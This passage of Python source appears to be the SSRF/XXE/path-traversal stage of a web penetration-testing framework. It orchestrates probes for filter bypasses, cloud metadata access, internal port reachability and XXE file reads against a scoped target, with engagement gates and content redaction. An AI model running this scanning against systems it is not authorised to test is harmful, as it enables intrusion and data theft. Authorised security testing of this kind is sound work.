    info("caps: fetch=%s | ip-variants=%s | parse-tricks=%s | xxe=%s x %s | "
         "traverse=%s x %s probes | timing=%s samples"
         % (conf.get("ssrf_fetch_endpoints"), conf.get("ssrf_ip_variants"),
            conf.get("ssrf_parse_tricks"), conf.get("ssrf_xxe_targets"),
            conf.get("ssrf_xxe_payloads"), conf.get("ssrf_traverse_targets"),
            conf.get("ssrf_traverse_probes"), conf.get("ssrf_timing_samples")))

    F = Findings()
    emitted = set()

    def fadd(key, title, endpoint, detail, ev_ref="", cap_per_key=4):
        """Finding add with per-key cap (noise control)."""
        if sum(1 for x in F.items if x["key"] == key) >= cap_per_key:
            return
        F.add(key, title, endpoint, detail, ev_ref)

    meta = {"probes_total": 0}
    ctx = {"out": out, "coverage": {}, "pocs": [], "mode": "active",
           "base_dir": os.path.join(base_out, scope.engagement)}
    results_by_stage = {}
    qhttp = quiet_client(http, cfg, scope, ev)      # redacted-evidence client

    # ---------------- Stage A: discovery ----------------
    head("Stage A - SSRF/XXE/Traversal surface discovery "
         "(P12/P13/P14/P9/P5/P7/P2/P3/P8-seeded)")
    ckA = "stageA:discovery"
    if cp.is_done(ckA):
        cached = cp.result_of(ckA) or ([], {})
        ranked, meta = cached[0], dict(cached[1])
        meta["probes_total"] = meta.get("probes_total", 0)
        ok("Replayed %d targets (checkpoint)" % len(ranked))
    else:
        ranked, meta = discover_ssrf_surface(base_out, scope, conf)
        meta["probes_total"] = meta.get("probes_total", 0)
        cp.mark(ckA, [ranked, meta], summary="ssrf surface")
    ctx["mined_sources"] = meta.get("sources", [])
    ok("seed artifacts: %d sources | %d ranked targets"
       % (len(ctx["mined_sources"]), len(ranked)))

    fetch_targets = [t for t in ranked if t["kind"] == "fetch"]
    xxe_targets = [t for t in ranked if t["kind"] == "xxe"]
    trav_targets = [t for t in ranked if t["kind"] == "traverse"]
    header_targets = [t for t in ranked if t["kind"] == "header"]
    ctx["coverage"]["surface"] = ("fetch=%d xxe=%d traverse=%d header=%d"
                                  % (len(fetch_targets), len(xxe_targets),
                                     len(trav_targets), len(header_targets)))
    ok("%s" % ctx["coverage"]["surface"])

    if not ranked:
        err("Koi SSRF surface nahi mila. P2/P5/P7/P12 pehle chalao (url-fetch/"
            "import/redirect features wahan se aate hain) ya scope.json check.")
        F.add("ssrf_surface_sparse", "SSRF surface khali", scope.describe(),
              "seed artifacts nahi mile - P12 (redirect/xxe) + P5 (import/"
              "upload) + P7 (js params) chalao.", "ssrf_surface.json")
        ctx["coverage"]["surface"] = "NOT-FOUND"
        write_reports(out, scope, F, ctx, meta, {}, [], [], [], conf)
        return out

    base_url = meta.get("base_url") or scope.seed_urls()[0]
    try:
        _p = urllib.parse.urlsplit(base_url).port
        smoke_port = _p or (443 if base_url.startswith("https") else 80)
    except Exception:
        smoke_port = 80
    meta["smoke_port"] = smoke_port

    # ---------------- PASSIVE MODE ----------------
    if not getattr(cfg, "allow_active", True):
        warn("allow_active=False -> PASSIVE mode: seed census + offline "
             "hypotheses (0 network probes).")
        ctx["mode"] = "passive"
        hyps = build_ssrf_hypotheses([], [], [], [], [], [])
        chains = build_ssrf_chains(F, [], [], [], [], [], [], [], [])
        write_reports(out, scope, F, ctx, meta,
                      {"fetch": {"data": []}}, hyps, ranked, chains, conf)
        write_feedforward(out, PHASE, {"to_phase32_report": {"mode": "passive"}},
                          notes=["allow_active=false -> 0-probe passive run"])
        write_manifest(out, PHASE, ["ssrf_surface.json", "ssrf_targets.txt",
                                    "ssrf_test_plan.md", "findings.json",
                                    "feedforward.json"],
                       stats={"mode": "passive", "targets": len(ranked),
                              "hypotheses": len(hyps)})
        _rwx_tree(out)
        return out

    # ---------------- Stage B: baseline & calibration ----------------
    head("Stage B - Baseline & WAF calibration (+ soft-404 + home marker)")
    try:
        s404 = soft404_baseline(http, base_url)
        meta["soft404"] = s404 or {}
        ok("soft-404 baseline: %s" % ("set" if s404 else "flat"))
    except Exception as e:
        meta["soft404"] = {}
        warn("soft-404 baseline skip: %s" % e)
    home_sig = pick_home_marker(http, base_url, meta)
    meta["home_marker"] = bool(home_sig)
    ok("home marker: %s" % ("sha1=%s" % home_sig["sha1"][:12] if home_sig
                            else "unavailable"))
    baselines = {}
    for t in ranked[:20]:
        ep = t["url"].split("?")[0]
        if ep in baselines or not ep.startswith("http"):
            continue
        b = baseline_endpoint(http, ep, conf, cp, meta, tag="s")
        if b.get("ok"):
            baselines[ep] = b
    meta["waf_endpoints"] = sum(1 for b in baselines.values() if b.get("waf"))
    ok("baselines: %d endpoints | WAF-flagged: %d" % (len(baselines),
                                                      meta["waf_endpoints"]))

    # ---------------- Stage C: SSRF fetch engine ----------------
    head("Stage C - SSRF fetch engine (self-fetch / blind / scheme / loopback)")
    fetch_recs = []
    fetch_cap = int(conf.get("ssrf_fetch_endpoints", 12))
    for i, t in enumerate(fetch_targets[:fetch_cap], 1):
        ck = "fetch:%s" % t["url"]
        if cp.is_done(ck):
            rec = cp.result_of(ck)
        else:
            rec = fetch_probe_endpoint(http, qhttp, t, base_url, meta, conf,
                                       cp, home_sig, smoke_port=smoke_port)
            cp.mark(ck, rec, summary="%s %s" % (rec.get("verdict"),
                                                rec.get("technique", "")))
        fetch_recs.append(rec)
        prog = "  [%d/%d] %s %s" % (i, min(len(fetch_targets), fetch_cap),
                                    rec["verdict"], t["url"][:70])
        print(prog)
        if interrupted():
            warn("Interrupt - clean stop (resume karo).")
            break
    # findings (multi-signal ladder)
    for r in fetch_recs:
        sigs = " ".join(r.get("signals", []))
        if r.get("technique") == "full-response-ssrf":
            fadd("ssrf_full_read", "FULL-READ SSRF (poora response wapas)",
                 r["url"], "homepage/canary sha1 fetcher ke through match - "
                 "%s" % sigs[:200], "ssrf_matrix.json")
        if "scheme-file" in sigs:
            fadd("ssrf_scheme_file", "file:// scheme fetcher se readable",
                 r["url"], "file:///etc/hostname shape-response - local file "
                 "read primitive (content redacted)", "ssrf_matrix.json")
        if r.get("technique") == "blind-differential-ssrf" or \
                "blind:" in sigs:
            fadd("ssrf_blind_differential", "Blind SSRF (differential)",
                 r["url"], "self vs NXDOMAIN status/len/timing differential - "
                 "%s" % sigs[:200], "ssrf_matrix.json")
        if "loopback:" in sigs:
            fadd("ssrf_self_fetch", "Server-side fetch primitive confirmed",
                 r["url"], "loopback probe differential - fetcher requests "
                 "khud fire karta hai", "ssrf_matrix.json")
    results_by_stage["fetch"] = {"data": fetch_recs}
    ok("fetch engine: %d endpoints -> %s" % (len(fetch_recs), {
        r["verdict"] for r in fetch_recs}))

    # ---------------- Stage D: bypass matrix + cloud metadata ----------------
    head("Stage D - Filter-bypass matrix (IP/parser/redirect) + Cloud IMDS "
         "(CROWN JEWEL, safe-paths)")
    bypass_recs, metadata_recs = [], []
    bp_pool = [r for r in fetch_recs if r.get("verdict") == "BLOCKED"]
    bp_pool += [r for r in fetch_recs
                if r.get("verdict") in ("CONFIRMED", "SUSPECTED")]
    bp_targets = bp_pool or fetch_recs[:1]
    md_pool = [r for r in fetch_recs
               if r.get("verdict") in ("CONFIRMED", "SUSPECTED")] or \
        [r for r in fetch_recs if r.get("verdict") not in ("BLOCKED", "NOISE")]
    md_targets = md_pool[:2]
    for t in bp_targets[:4]:
        ck = "bypass:%s" % t["url"]
        if cp.is_done(ck):
            rec = cp.result_of(ck)
        else:
            rec = bypass_matrix(http, {"url": t["url"], "param": t.get("param")},
                                base_url, meta, conf, cp, smoke_port)
            cp.mark(ck, rec, summary="%s" % rec.get("winning_variant", ""))
        bypass_recs.append(rec)
        if rec.get("winning_variant"):
            w = rec["winning_variant"]
            ok("BYPASS WINNER: %s @ %s" % (w, t["url"][:60]))
            if w.startswith("ip:"):
                fadd("ssrf_ip_bypass", "IP-encoding SSRF-filter bypass (%s)" % w,
                     t["url"], "variant ne block ko bypass kiya - string-based "
                     "allow-list bug", "bypass_matrix.json")
            elif w == "redirect-bounce":
                fadd("ssrf_redirect_internal", "Redirect-chain internal bounce",
                     t["url"], "target 302 se fetcher ko internal par le gaya - "
                     "first-URL-only validation", "bypass_matrix.json")
            else:
                fadd("ssrf_parse_confusion", "URL-parser confusion bypass (%s)" % w,
                     t["url"], "different-parser bug - host validation bypass",
                     "bypass_matrix.json")
    md_cap = 2 if conf.get("ssrf_metadata_probe") else 0
    for t in (md_targets[:md_cap] if md_cap else []):
        ck = "metadata:%s" % t["url"]
        if cp.is_done(ck):
            rec = cp.result_of(ck)
        else:
            rec = metadata_engine(http, qhttp, {"url": t["url"],
                                                "param": t.get("param")},
                                  base_url, meta, conf, cp)
            cp.mark(ck, rec, summary="%s" % rec.get("verdict", ""))
        metadata_recs.append(rec)
        if rec.get("verdict") == "CONFIRMED":
            provs = ",".join(p["provider"] for p in rec.get("providers", []))
            ok("CROWN JEWEL: metadata reachable via %s (%s)" % (t["url"][:50],
                                                                provs))
            fadd("ssrf_metadata_reachable", "Cloud metadata reachable (IMDS)",
                 t["url"], "providers=%s | SAFE paths only - credential paths "
                 "kabhi fetch nahi hue (manual wave)" % provs,
                 "metadata_cloud.json")
        elif rec.get("imds2_hint"):
            fadd("ssrf_metadata_imdsv2", "IMDSv2 hardening detected", t["url"],
                 "metadata 401/token-required - plain-GET SSRF blocked "
                 "(header-injection chain manual)", "metadata_cloud.json")
    results_by_stage["bypass"] = {"data": bypass_recs}
    results_by_stage["metadata"] = {"data": metadata_recs}

    # ---------------- Stage E: internal smoke (RoE-gated) ----------------
    head("Stage E - Internal smoke (gated=%s, loopback+own-IP, banner-only)"
         % (not conf.get("ssrf_internal_smoke")))
    smoke_recs = []
    target_ip = ""
    try:
        dr = dns_resolve(host_of(base_url))
        target_ip = (dr.get("ips") or [""])[0]
    except Exception:
        pass
    for t in (md_pool[:1] or bp_targets[:1]):
        ck = "smoke:%s" % t["url"]
        if cp.is_done(ck):
            rec = cp.result_of(ck)
        else:
            rec = internal_smoke(http, {"url": t["url"], "param": t.get("param")},
                                 base_url, meta, conf, cp, target_ip=target_ip)
            cp.mark(ck, rec, summary="smoke gated=%s" % rec.get("gated"))
        smoke_recs.append(rec)
        if not rec.get("gated"):
            for hh3 in rec.get("hosts", []):
                for p in hh3.get("ports", []):
                    if p.get("verdict") == "REACHABLE":
                        ok("SMOKE REACHABLE: %s:%s (%s)" % (p["host"], p["port"],
                                                            p.get("server") or
                                                            "banner n/a"))
        if any(p.get("verdict") == "REACHABLE"
               for hh3 in rec.get("hosts", []) for p in hh3.get("ports", [])):
            fadd("ssrf_internal_reachable", "Internal service reachable via "
                 "fetcher", t["url"], "loopback/own-IP smoke - banner-only "
                 "(koi enumeration nahi)", "internal_smoke.json")
    results_by_stage["smoke"] = {"data": smoke_recs}

    # ---------------- Stage F: XXE engine ----------------
    head("Stage F - XXE engine (GET-param XML + RoE-gated POST families)")
    xxe_recs, xxe_post_recs = [], []
    xxe_cap = int(conf.get("ssrf_xxe_targets", 10))
    xx_pool = xxe_targets[:xxe_cap]
    # fetch-targets jinhe XML-ish maan sakte hain (import paths) bhi add
    for ip2 in meta.get("import_paths", [])[:3]:
        if all(ip2 != x["url"] for x in xx_pool):
            xx_pool.append({"kind": "xxe", "url": ip2, "method": "POST",
                            "param": "xml", "source": "P5:import"})
    for i, t in enumerate(xx_pool, 1):
        ck = "xxe:%s" % t["url"]
        if cp.is_done(ck):
            rec = cp.result_of(ck)
        else:
            rec = xxe_probe_endpoint(http, qhttp, t, base_url, meta, conf,
                                     cp, smoke_port=smoke_port)
            cp.mark(ck, rec, summary="%s %s" % (rec.get("verdict"),
                                                rec.get("technique", "")))
        xxe_recs.append(rec)
        print("  [%d/%d] %s %s" % (i, len(xx_pool), rec["verdict"],
                                   t["url"][:66]))
    # POST families (RoE-gated)
    post_pool = [t for t in xx_pool if (t.get("method") or "").upper() ==
                 "POST" or re.search(r"(?i)(import|upload|saml|xmlrpc|rpc2|svg|"
                                     r"parse|convert|render)", t["url"])][:6]
    if post_pool:
        info("POST XXE families: %d candidates | gate=%s" % (
            len(post_pool), "ON" if conf.get("ssrf_allow_post") else "OFF"))
    for t in post_pool:
        ck = "xxepost:%s" % t["url"]
        if cp.is_done(ck):
            rec = cp.result_of(ck)
        else:
            t2 = dict(t)
            if "saml" in t["url"].lower():
                t2["saml"] = True
            rec = xxe_post_family_probes(http, qhttp, t2, base_url, meta,
                                         conf, cp, smoke_port=smoke_port)
            cp.mark(ck, rec, summary="%s" % rec.get("verdict", ""))
        xxe_post_recs.append(rec)
    # XXE findings
    for r in xxe_recs:
        sigs = " ".join(r.get("signals", []))
        if "classic" in sigs and ("in-band-marker" in sigs or
                                  r.get("verdict") == "CONFIRMED"):
            fadd("xxe_file_read", "XXE external entity file read", r["url"],
                 "parser ne entity resolve karke file content echo kiya "
                 "(marker-boolean; content redacted) - %s" % sigs[:180],
                 "xxe_matrix.json")
        elif "error-differential" in sigs:
            fadd("xxe_error_based", "XXE error-based signal", r["url"],
                 "parser error family me differential - %s" % sigs[:180],
                 "xxe_matrix.json")
        if "param-entity" in sigs:
            fadd("xxe_param_entity_blind", "Param-entity blind XXE", r["url"],
                 "DTD fetch attempt processed (OOB-less differential)",
                 "xxe_matrix.json")
        if "dtd-internal" in sigs:
            fadd("xxe_dtd_internal_fetch", "Internal DTD fetch (XXE->SSRF)",
                 r["url"], "parser arbitrary URL se DTD laata hai",
                 "xxe_matrix.json")
        if "xinclude" in sigs:
            fadd("xxe_xinclude", "XInclude file read", r["url"],
                 "xi:include parse=text resolved", "xxe_matrix.json")
        if "php-filter" in sigs:
            fadd("xxe_php_filter", "php://filter wrapper resolved", r["url"],
                 "PHP wrapper chain (double-decode roundtrip - content kabhi "
                 "store nahi)", "xxe_matrix.json")
        if r.get("dtd_rejected"):
            fadd("xxe_parser_hardened", "Parser hardened (DOCTYPE reject)",
                 r["url"], "external entities disallowed - positive signal",
                 "xxe_matrix.json", cap_per_key=2)
    for r in xxe_post_recs:
        for f in r.get("families", []):
            if not f.get("marker"):
                continue
            fkey = {"svg": "xxe_svg_doc", "docx": "xxe_office_import",
                    "saml": "xxe_saml", "xmlrpc": "xxe_xmlrpc_pingback"}.get(
                        f.get("family"), "xxe_file_read")
            fadd(fkey, "XXE %s family confirmed" % f.get("family"), r["url"],
                 "family=%s marker=%s (content redacted)" % (
                     f.get("family"), f.get("marker")), "xxe_post_matrix.json")
        if r.get("verdict") == "SKIPPED":
            fadd("ssrf_post_gate_skipped", "POST XXE RoE-gated (skipped)",
                 r["url"], "ssrf_allow_post=false - payloads INERT ready hain "
                 "xxe_payloads/ me", "xxe_post_matrix.json", cap_per_key=1)
    results_by_stage["xxe"] = {"data": xxe_recs}
    results_by_stage["xxe_post"] = {"data": xxe_post_recs}
    ok("xxe: %d parser endpoints + %d post targets" % (len(xxe_recs),
                                                       len(xxe_post_recs)))

    # ---------------- Stage G: traversal matrix ----------------
    head("Stage G - Traversal ULTRA matrix (30 encodings, content-redacted)")
    trav_recs = []
    trav_cap = int(conf.get("ssrf_traverse_targets", 12))
    trav_pool = trav_targets[:trav_cap]
    # fetch targets with file-ish params ko bhi traverse pool me daalo
    for t in fetch_targets:
        p = (t.get("param") or t.get("needs_param") or "").lower()
        if re.search(r"(?i)(file|path|doc|download|read|include|template|view)",
                     p) and all(t["url"] != x["url"] for x in trav_pool):
            trav_pool.append(t)
    stack_hints = " ".join(meta.get("os_hints", []))
    for i, t in enumerate(trav_pool, 1):
        ck = "trav:%s" % t["url"]
        if cp.is_done(ck):
            rec = cp.result_of(ck)
        else:
            rec = traversal_probe_endpoint(http, qhttp, t, base_url, meta,
                                           conf, cp, stack_hints=stack_hints)
            cp.mark(ck, rec, summary="%s %s" % (rec.get("verdict"),
                                                rec.get("winning_variant", "")))
        trav_recs.append(rec)
        print("  [%d/%d] %s %s" % (i, len(trav_pool), rec["verdict"],
                                   t["url"][:66]))
    for r in trav_recs:
        if r.get("verdict") == "CONFIRMED":
            tech = r.get("technique", "")
            key = ("traversal_absolute_path" if tech == "traversal-absolute"
                   else "traversal_null_byte_legacy" if tech ==
                   "traversal-null-byte-legacy" else "traversal_file_read")
            fadd(key, "Path traversal file read (%s)" %
                 r.get("winning_variant", "enc"), r["url"],
                 "marker match, content REDACTED - %s" %
                 " | ".join(r.get("signals", [])[:3]), "traversal_matrix.json")
            if tech == "traversal-encoding":
                fadd("traversal_encoding_bypass", "Traversal encoding bypass",
                     r["url"], "winning_variant=%s - filter sirf raw ../ ko "
                     "jaanta hai" % r.get("winning_variant"),
                     "traversal_matrix.json", cap_per_key=2)
        elif r.get("verdict") == "HARDENED":
            fadd("traversal_hardened", "Traversal hardened (explicit refuse)",
                 r["url"], "path-filter present - positive signal",
                 "traversal_matrix.json", cap_per_key=2)
    results_by_stage["traversal"] = {"data": trav_recs}
    ok("traversal: %d endpoints" % len(trav_recs))

    # ---------------- Stage C2: header-host probes ----------------
    head("Stage C2 - Header-host injection (X-Forwarded-Host/Original-URL)")
    header_recs = []
    if conf.get("ssrf_header_probe", True):
        hdr_pool = (header_targets[:4] or
                    [t for t in fetch_targets[:4]])[:5]
        for t in hdr_pool:
            ck = "hdr:%s" % t["url"]
            if cp.is_done(ck):
                rec = cp.result_of(ck)
            else:
                rec = header_host_probe(http, t["url"].split("?")[0], meta,
                                        conf, cp)
                cp.mark(ck, rec, summary=rec.get("verdict", ""))
            header_recs.append(rec)
            if rec.get("verdict") == "SUSPECTED":
                fadd("ssrf_header_host_inject", "Header-host injection surface",
                     t["url"], "X-Forwarded-Host/Original-URL differential - "
                     "cache-poison + reset-poison chain (P26)",
                     "header_host_probe.json")
    else:
        info("ssrf_header_probe=false -> skip")
    results_by_stage["header"] = {"data": header_recs}

    # ---------------- Stage H+I: differential + technique matrix ----------------
    head("Stage H/I - Differential summary + technique matrix (40+ rows)")
    diff_sum = differential_summary(fetch_recs, conf)
    ok("differential: confirmed=%d suspected=%d blocked=%d" % (
        diff_sum["confirmed"], diff_sum["suspected"], diff_sum["blocked"]))
    tm = build_technique_matrix(fetch_recs, bypass_recs, metadata_recs,
                                smoke_recs, xxe_recs, xxe_post_recs, trav_recs,
                                header_recs)
    results_by_stage["techniques"] = {"data": tm}
    ok("technique matrix: %d rows" % len(tm))

    # ---------------- Stage J: chains & hypotheses ----------------
    head("Stage J - Kill-chains & manual-wave hypotheses")
    chains = build_ssrf_chains(F, fetch_recs, metadata_recs, xxe_recs,
                               xxe_post_recs, trav_recs, bypass_recs,
                               header_recs, smoke_recs)
    ctx["chains"] = chains
    hyps = build_ssrf_hypotheses(fetch_recs, metadata_recs, xxe_recs,
                                 xxe_post_recs, trav_recs, bypass_recs)
    for c in chains:
        ok("CHAIN: %s [%s]" % (c["name"], c["severity"]))

    # ---------------- Stage K: reports ----------------
    head("Stage K - Reports (findings / matrices / INERT payloads / catalog)")
    ctx["coverage"]["probes"] = meta.get("probes_total", 0)
    write_reports(out, scope, F, ctx, meta, results_by_stage, hyps, ranked,
                  chains, conf)
    dur = time.time() - t_start
    ok("Phase 15 done: %d findings | %d probes | %.1fs | out=%s"
       % (len(F.items), meta.get("probes_total", 0), dur, out))
    return out


# ===========================================================================
# CLI (standalone entry - wasp.py ke through hi chalna recommended)
# ===========================================================================
def main():
    print("WASP mod_ssrf.py (Phase 15 - SSRF/XXE/Traversal, v%s)" % PLAN_VERSION)
    print("  run       : python3 wasp.py run --module 15   (ya --module ssrf)")
    print("  self-test : python3 test_mod_ssrf.py")
    print("\n  RoE gates (config.json): ssrf_allow_post=false (default), "
          "ssrf_internal_smoke=false (default)")
    print("  Safety: zero external egress | metadata SAFE-paths only (creds "
          "kabhi nahi) | file content REDACTED | INERT payloads")


if __name__ == "__main__":
    main()
